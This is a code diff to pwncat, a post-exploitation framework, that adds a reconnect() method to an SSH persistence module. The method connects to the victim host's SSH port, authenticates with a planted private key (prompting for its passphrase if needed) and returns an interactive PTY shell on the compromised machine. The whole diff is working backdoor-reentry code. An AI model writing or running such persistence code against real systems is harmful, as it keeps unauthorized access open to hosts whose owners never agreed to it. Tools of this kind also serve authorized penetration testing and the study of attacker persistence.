@@ -1,6 +1,10 @@
 import os
 import shutil
+import socket
 from typing import Optional
+
+import paramiko
+from prompt_toolkit import prompt
 
 import pwncat
 import pwncat.tamper
@@ -134,6 +138,50 @@ class Method(PersistenceMethod):
                 if pubkey[0] in tamper.added_lines:
                     pwncat.victim.tamper.remove(tamper)
                     break
+
+    def reconnect(self, user: Optional[str] = None) -> socket.SocketType:
+        """ Reconnect to the host idenified in ``pwncat.victim.host`` and return an
+        open socket-like object connected to shell's stdio. """
+
+        try:
+            # Connect to the remote host's ssh server
+            sock = socket.create_connection((pwncat.victim.host.ip, 22))
+        except Exception as exc:
+            raise PersistenceError(str(exc))
+
+        # Create a paramiko SSH transport layer around the socket
+        t = paramiko.Transport(sock)
+        try:
+            t.start_client()
+        except paramiko.SSHException:
+            raise PersistenceError("ssh negotiation failed")
+
+        try:
+            # Load the private key for the user
+            key = paramiko.RSAKey.from_private_key_file(pwncat.victim.config["privkey"])
+        except:
+            password = prompt("RSA Private Key Passphrase: ", is_password=True)
+            key = paramiko.RSAKey.from_private_key_file(
+                pwncat.victim.config["privkey"], password
+            )
+
+        # Attempt authentication
+        try:
+            t.auth_publickey(user, key)
+        except paramiko.ssh_exception.AuthenticationException:
+            raise PersistenceError("authorized key authentication failed")
+
+        if not t.is_authenticated():
+            t.close()
+            sock.close()
+            raise PersistenceError("authorized key authentication failed")
+
+        # Open an interactive session
+        chan = t.open_session()
+        chan.get_pty()
+        chan.invoke_shell()
+
+        return chan
 
     def escalate(self, user: Optional[str] = None) -> bool:
         """ Utilize this persistence method to get a local shell """
